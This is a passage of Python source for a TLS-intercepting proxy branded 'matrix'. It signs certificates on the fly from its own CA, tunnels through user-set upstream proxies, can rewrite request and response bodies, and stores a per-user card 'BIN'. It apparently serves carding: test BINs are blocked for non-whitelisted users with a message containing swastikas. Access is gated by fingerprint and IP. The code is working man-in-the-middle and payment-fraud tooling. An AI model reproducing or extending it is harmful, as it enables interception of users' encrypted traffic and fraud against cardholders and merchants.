				self.send_response_only(404, "Not Found")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
			if self.hostname in allowed_domains:
				self.connect_intercept()
			else:
				self.connect_no_intercept()
		except Exception as e:
			pass


	def do_REQ(self):
		try:
			if not hasattr(self, 'ishttps'):
				self.hostname = urllib.parse.urlparse(self.path).netloc
				self.ishttps = False

			if self.hostname == "matrix":
				self.handle_custom_domain()
				return
			

			if not self.isAuthorized():
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://matrix")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return

			else:
				def create_proxy_connection(scheme, netloc):
					full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
					proxy_host = full_proxy[0]
					proxy_port = int(full_proxy[1])
					try:
						proxy_user = full_proxy[2]
					except:
						proxy_user = ""
					try:
						proxy_pass = full_proxy[3]
					except:
						proxy_pass = ""
					
					credentials = f"{proxy_user}:{proxy_pass}"
					auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"

					if scheme == "https":
						context = ssl.create_default_context()
						raw_socket = socket.create_connection((proxy_host, proxy_port))
						if proxy_user != "" and proxy_pass != "":
							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\nProxy-Authorization: {auth_header}\r\n\r\n".encode())
						else:
							raw_socket.sendall(f"CONNECT {netloc}:443 HTTP/1.0\r\nHost: {netloc}:443\r\n\r\n".encode())
						response = http.client.HTTPResponse(raw_socket)
						response.begin()
						if response.status != 200:
							raise Exception("Proxy connection failed")
						conn = http.client.HTTPSConnection(netloc, context=context)
						conn.sock = context.wrap_socket(raw_socket, server_hostname=netloc)
					else:
						conn = http.client.HTTPConnection(proxy_host, proxy_port)
						conn.set_tunnel(netloc, headers={"Proxy-Authorization": auth_header})
					
					return conn

				req = self
				content_length = int(req.headers.get("Content-Length", 0))
				req_body = self.rfile.read(content_length) if content_length else b""

				if req.path[0] == "/":
					if isinstance(self.connection, ssl.SSLSocket):
						req.path = "https://%s%s" % (req.headers["Host"], req.path)
					else:
						req.path = "http://%s%s" % (req.headers["Host"], req.path)

				if request_handler is not None:
					req_body_modified = request_handler(req, req_body)
					if req_body_modified is False:
						self.send_error(403)
						return
					if req_body_modified is not None:
						req_body = req_body_modified

				def remove_key_case_insensitive(d, key_to_remove):
					key_to_remove_lower = key_to_remove.lower()
					
					keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
					
					for key in keys_to_delete:
						del d[key]

				remove_key_case_insensitive(req.headers, "Content-Length")
				req.headers["Content-Length"] = str(len(req_body))
				
				u = urllib.parse.urlsplit(req.path)
				scheme = u.scheme
				netloc = u.netloc
				path = u.path + "?" + u.query if u.query else u.path
				assert scheme in ("http", "https")
				if netloc:
					req.headers["Host"] = netloc
				req.headers = self.filter_headers(req.headers)  # type: ignore

				origin = (scheme, netloc)
				try:
					if origin not in self.tls.conns:
						self.tls.conns[origin] = create_proxy_connection(scheme, netloc)
					conn = self.tls.conns[origin]
					conn.request(self.command, path, req_body, dict(req.headers))
					res = conn.getresponse()

					# support streaming
					cache_control = res.headers.get("Cache-Control", "")
					if "Content-Length" not in res.headers and "no-store" in cache_control:
						if response_handler is not None:
							response_handler(req, req_body, res, "")
						res.headers = self.filter_headers(res.headers)
						self.relay_streaming(res)
						return

					res_body = res.read()
				except Exception as e:
					if origin in self.tls.conns:
						del self.tls.conns[origin]
					self.send_error(502)
					return

				if response_handler is not None:
					content_encoding = res.headers.get("Content-Encoding", "identity")
					res_body_plain = self.decode_content_body(res_body, content_encoding)
					res_body_modified = response_handler(req, req_body, res, res_body_plain)
					if res_body_modified is False:
						self.send_error(403)
						return
					if res_body_modified is not None:
						res_body = self.encode_content_body(res_body_modified, content_encoding)
						def remove_key_case_insensitive(d, key_to_remove):
							key_to_remove_lower = key_to_remove.lower()
							
							keys_to_delete = [k for k in d if k.lower() == key_to_remove_lower]
							
							for key in keys_to_delete:
								del d[key]

						remove_key_case_insensitive(res.headers, "Content-Length")
						res.headers["Content-Length"] = str(len(res_body))

				res.headers = self.filter_headers(res.headers)

				self.send_response_only(res.status, res.reason)
				for k, v in res.headers.items():
					self.send_header(k, v)
				self.end_headers()
				self.wfile.write(res_body)
				self.wfile.flush()
		except:
			pass

	def connect_intercept(self):
		hostname = self.path.split(":")[0]

		with self.lock:
			key_file_name, cert_file_name = self.create_and_sign_cert(hostname, "ca-cert.pem", "ca-key.pem")

		self.send_response(200, "Connection Established")
		self.end_headers()

		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
		context.verify_mode = ssl.CERT_NONE
		context.load_cert_chain(cert_file_name, key_file_name)

		try:
			self.connection = context.wrap_socket(self.connection, server_side=True)
		except ssl.SSLEOFError:
			return

		self.rfile = self.connection.makefile("rb", self.rbufsize)
		self.wfile = self.connection.makefile("wb", self.wbufsize)

		conntype = self.headers.get("Proxy-Connection", "")
		if self.protocol_version == "HTTP/1.1" and conntype.lower() != "close":
			self.close_connection = False
		else:
			self.close_connection = True

	def connect_no_intercept(self):
		full_proxy = self.getCurrentUser().get("settings").get("proxy").split(":")
		proxy_host = full_proxy[0]
		proxy_port = int(full_proxy[1])
		try:
			proxy_user = full_proxy[2]
		except:
			proxy_user = ""
		try:
			proxy_pass = full_proxy[3]
		except:
			proxy_pass = ""

		credentials = f"{proxy_user}:{proxy_pass}"
		auth_header = f"Basic {base64.b64encode(credentials.encode()).decode()}"

		remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		remote.connect((proxy_host, proxy_port))
		if proxy_user != "" and proxy_pass != "":
			remote.sendall(
				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
				f"Host: {self.hostname}:443\r\n"
				f"Proxy-Authorization: {auth_header}\r\n"
				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
			)
		else:
			remote.sendall(
				f"CONNECT {self.hostname}:443 HTTP/1.1\r\n"
				f"Host: {self.hostname}:443\r\n"
				f"Proxy-Connection: Keep-Alive\r\n\r\n".encode()
			)

		response = http.client.HTTPResponse(remote)
		response.begin()
		if response.status != 200:
			self.send_error(502)
			return

		self.send_response(200, "Connection Established")
		self.end_headers()

		inputs = [self.connection, remote]
		while inputs:
			readable, _, _ = select.select(inputs, [], [])
			for r in readable:
				data = r.recv(4096)
				if not data:
					inputs.remove(r)
				else:
					if r is remote:
						self.connection.sendall(data)
					else:
						remote.sendall(data)

		remote.close()

	def relay_streaming(self, res):
		self.send_response_only(res.status, res.reason)
		for k, v in res.headers.items():
			self.send_header(k, v)
		self.end_headers()
		try:
			while True:
				chunk = res.read(8192)
				if not chunk:
					break
				self.wfile.write(chunk)
			self.wfile.flush()
		except socket.error:
			# connection closed by client
			pass

	def filter_headers(self, headers: HTTPMessage) -> HTTPMessage:
		# http://tools.ietf.org/html/rfc2616#section-13.5.1
		hop_by_hop = (
			"connection",
			"keep-alive",
			"proxy-authenticate",
			"proxy-authorization",
			"te",
			"trailers",
			"transfer-encoding",
			"upgrade",
		)
		for k in hop_by_hop:
			del headers[k]

		# accept only supported encodings
		if "Accept-Encoding" in headers:
			ae = headers["Accept-Encoding"]
			filtered_encodings = [
				x
				for x in re.split(r",\s*", ae)
				if x in ("identity", "gzip", "x-gzip", "deflate")
			]
			headers["Accept-Encoding"] = ", ".join(filtered_encodings)

		return headers

	do_GET = do_REQ
	do_HEAD = do_REQ
	do_POST = do_REQ
	do_PUT = do_REQ
	do_DELETE = do_REQ
	do_OPTIONS = do_REQ

	lock = threading.Lock()


	def __init__(self, *args, **kwargs):
		self.tls = threading.local()
		self.tls.conns = {}

		super().__init__(*args, **kwargs)

	def log_error(self, format, *args):
		pass

	def handle_custom_domain(self):
		if not self.ishttps:
			self.send_response_only(302, "Found")
			self.send_header("Location", "https://matrix")
			self.send_header("Content-Type", "text/html; charset=UTF-8")
			self.send_header("Content-Length", "0")
			self.end_headers()
		else:
			if self.path == "/cert.pem":
				self.send_cacert()
				return
			if self.path == "/getcreds":
				if isWin():
					getcredsf = open("site\\getcreds.html", "rb")
				else:
					getcredsf = open("site/getcreds.html", "rb")
				getcreds = getcredsf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(getcreds))
				self.end_headers()
				self.wfile.write(getcreds)
				self.wfile.flush()
				getcredsf.close()
				return
			if self.path == "/fingerprint.js":
				if isWin():
					fingerprintjsf = open("site\\fingerprint.js", "rb")
				else:
					fingerprintjsf = open("site/fingerprint.js", "rb")
				fingerprintjs = fingerprintjsf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/javascript; charset=UTF-8")
				self.send_header("Content-Length", len(fingerprintjs))
				self.end_headers()
				self.wfile.write(fingerprintjs)
				self.wfile.flush()
				fingerprintjsf.close()
				return
			if self.path == "/logs" and self.isAuthorized():
				try:
					templogs = self.getCurrentUser().get("settings").get("logs")
					while len(templogs) < 10:
						templogs.insert(0, '')
					templogs = json.dumps(templogs).encode()
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(templogs))
					self.end_headers()
					self.wfile.write(templogs)
					self.wfile.flush()
				except:
					templogs = json.dumps(['','','','','','','','','',''])
					self.send_response_only(200, "OK")
					self.send_header("Content-Type", "application/json; charset=UTF-8")
					self.send_header("Content-Length", len(templogs))
					self.end_headers()
					self.wfile.write(templogs)
					self.wfile.flush()
				return
			if self.path == "/settings" and self.isAuthorized():
				if isWin():
					authorizedf = open("site\\settings.html", "rb")
				else:
					authorizedf = open("site/settings.html", "rb")
				authorized = authorizedf.read()

				try:
					authorized = authorized.replace(b"PROXYVAL", self.getCurrentUser().get("settings").get("proxy").encode())
				except:
					authorized = authorized.replace(b"PROXYVAL", b"")

				try:
					authorized = authorized.replace(b"BINVAL", self.getCurrentUser().get("settings").get("bin").encode())
				except:
					authorized = authorized.replace(b"BINVAL", b"")

				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(authorized))
				self.end_headers()
				self.wfile.write(authorized)
				self.wfile.flush()
				authorizedf.close()
				return
			if self.path == "/saveSettings" and self.isAuthorized():
				try:
					content_length = int(self.headers.get("Content-Length", 0))
					request_body = self.rfile.read(content_length) if content_length else b""
					jsonData = json.loads(request_body.decode())

					settings = self.getCurrentUser().get("settings")
					settings["proxy"] = jsonData["proxy"]
					if jsonData["bin"].startswith("424242") and self.getCurrentUser().get("username") not in bin_whitelist:
						settings["bin"] = "卐 BIN BLACKLISTED BY matrix STAFF 卐"
					else:
						settings["bin"] = jsonData["bin"]

					userDatabase.update_one(
						{"username": self.getCurrentUser().get("username")},
						{"$set": {"settings": settings}}
					)
				except:
					pass

				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", 2)
				self.end_headers()
				self.wfile.write(b"OK")
				self.wfile.flush()
				return
			elif self.isAuthorized():
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://matrix/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
			if self.path == "/":
				if isWin():
					loginpagef = open("site\\loginpage.html", "rb")
				else:
					loginpagef = open("site/loginpage.html", "rb")
				loginpage = loginpagef.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(loginpage))
				self.end_headers()
				self.wfile.write(loginpage)
				self.wfile.flush()
				loginpagef.close()
				return
			if self.path == "/wrongpassword":
				if isWin():
					wrongpasswordf = open("site\\wrongpassword.html", "rb")
				else:
					wrongpasswordf = open("site/wrongpassword.html", "rb")
				wrongpassword = wrongpasswordf.read()
				self.send_response_only(200, "OK")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", len(wrongpassword))
				self.end_headers()
				self.wfile.write(wrongpassword)
				self.wfile.flush()
				wrongpasswordf.close()
				return
			if self.path == "/login" and self.command == "POST":
				content_length = int(self.headers.get("Content-Length", 0))
				request_body = self.rfile.read(content_length) if content_length else b""
				jsonData = json.loads(request_body.decode())

				try:
					hashl = hashlib.sha256()
					hashl.update(jsonData["pass"].encode())
					hashedpass = hashl.hexdigest()
					if not (
						self.getUserByName(jsonData["user"]).get("password") == hashedpass and 
						jsonData["fingerprint"] in self.getUserByName(jsonData["user"]).get("fingerprint")
					):
						self.send_response_only(302, "Found")
						self.send_header("Location", "https://matrix/wrongpassword")
						self.send_header("Content-Type", "text/html; charset=UTF-8")
						self.send_header("Content-Length", "0")
						self.end_headers()
						return
				except:
					self.send_response_only(302, "Found")
					self.send_header("Location", "https://matrix/wrongpassword")
					self.send_header("Content-Type", "text/html; charset=UTF-8")
					self.send_header("Content-Length", "0")
					self.end_headers()
					return

				userDatabase.update_one(
					{"username": jsonData["user"]},
					{"$set": {"ip": self.client_address[0]}}
				)
				self.send_response_only(302, "Found")
				self.send_header("Location", "https://matrix/settings")
				self.send_header("Content-Type", "text/html; charset=UTF-8")
				self.send_header("Content-Length", "0")
				self.end_headers()
				return
		return

	def isAuthorized(self):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				return True
		return False

	def getCurrentUser(self):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				return user
		return False

	def addToLogs(self, text):
		client_ip = self.client_address[0]
		for user in userDatabase.find():
			if user.get("ip") == client_ip:
				settings = user.get("settings")

				try:
					oldlogs = user.get("settings").get("logs")
					if not isinstance(oldlogs, list):
						oldlogs = []
				except:
					oldlogs = []

				if len(oldlogs) >= 10:
					oldlogs.pop(0)

				oldlogs.append(text)
				settings["logs"] = oldlogs

				userDatabase.update_one(
					{"username": user.get("username")},
					{"$set": {"settings": settings}}
				)

	def getUserByName(self, username):
		try:
			user = userDatabase.find_one({"username": username})
			if user.get("username") == username:
				return user
			else:
				return False
		except:
			return False

	def getFormattedProxy(self):
		try:
			ip, port, user, passwd = self.getCurrentUser().get("settings").get("proxy").split(":")
			return {"http": "http://"+user+":"+passwd+"@"+ip+":"+port, "https": "http://"+user+":"+passwd+"@"+ip+":"+port}
		except:
			ip, port = self.getCurrentUser().get("settings").get("proxy").split(":")
			return {"http": "http://"+ip+":"+port, "https": "http://"+ip+":"+port} 

	def create_and_sign_cert(self, domain, ca_cert_file, ca_key_file, days=365):
		if isWin():
			if os.path.isfile("certs\\"+str(domain)+".key") and os.path.isfile("certs\\"+str(domain)+".crt"):
				return "certs\\"+domain+".key", "certs\\"+domain+".crt"
		else:
			if os.path.isfile("certs/"+str(domain)+".key") and os.path.isfile("certs/"+str(domain)+".crt"):
				return "certs/"+domain+".key", "certs/"+domain+".crt"

		with open(ca_cert_file, "rb") as f:
			ca_cert_pem = f.read()
		ca_cert = crypto.load_certificate(crypto.FILETYPE_PEM, ca_cert_pem)

		with open(ca_key_file, "rb") as f:
			ca_key_pem = f.read()
		ca_key = crypto.load_privatekey(crypto.FILETYPE_PEM, ca_key_pem)

		domain_key = crypto.PKey()
		domain_key.generate_key(crypto.TYPE_RSA, 2048)

		csr = crypto.X509Req()
		subject = csr.get_subject()
		subject.CN = domain
		csr.set_pubkey(domain_key)
		csr.sign(domain_key, 'sha256')

		domain_cert = crypto.X509()
		domain_cert.set_version(2)
		domain_cert.set_serial_number(int(os.urandom(16).hex(), 16))
		domain_cert.gmtime_adj_notBefore((days * 24 * 60 * 60) * -1)
		domain_cert.gmtime_adj_notAfter(days * 24 * 60 * 60)
		domain_cert.set_subject(csr.get_subject())
		domain_cert.set_issuer(ca_cert.get_subject())
		domain_cert.set_pubkey(csr.get_pubkey())

		san = f'DNS:{domain}'
		ext = crypto.X509Extension(b'subjectAltName', False, san.encode('ascii'))
		domain_cert.add_extensions([ext])

		domain_cert.sign(ca_key, 'sha256')

		if isWin():
			key_file = open("certs\\"+domain+".key", "wb+")
			cert_file = open("certs\\"+domain+".crt", "wb+")
		else:
			key_file = open("certs/"+domain+".key", "wb+")
			cert_file = open("certs/"+domain+".crt", "wb+")
		key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, domain_key))
		cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, domain_cert))
		key_file.close()
		cert_file.close()

		return key_file.name, cert_file.name


	def encode_content_body(self, text: bytes, encoding: str) -> bytes:
		if encoding == "identity":
			data = text
		elif encoding in ("gzip", "x-gzip"):
			data = gzip.compress(text)
		elif encoding == "deflate":
			data = zlib.compress(text)
		elif encoding == "br":
			data = brotli.compress(text)
		else:
			raise Exception("Unknown Content-Encoding: %s" % encoding)
		return data

	def decode_content_body(self, data: bytes, encoding: str) -> bytes:
		if encoding == "identity":
			text = data
		elif encoding in ("gzip", "x-gzip"):
			text = gzip.decompress(data)
		elif encoding == "deflate":
			try:
				text = zlib.decompress(data)
			except zlib.error:
				text = zlib.decompress(data, -zlib.MAX_WBITS)
		elif encoding == "br":
			text = brotli.decompress(data)
		else:
			raise Exception("Unknown Content-Encoding: %s" % encoding)
		return text
		
	def send_cacert(self):
		with open("ca-cert.pem", "rb") as f:
			data = f.read()

		self.send_response(200, "OK")
		self.send_header("Content-Type", "application/x-x509-ca-cert")
		self.send_header("Content-Length", str(len(data)))
		self.send_header("Connection", "close")
		self.end_headers()
		self.wfile.write(data)


http.server.test(
	HandlerClass=ProxyRequestHandler,
	ServerClass=ThreadingHTTPServer,
	protocol="HTTP/1.1",
	port=1714,
	bind="0.0.0.0",
)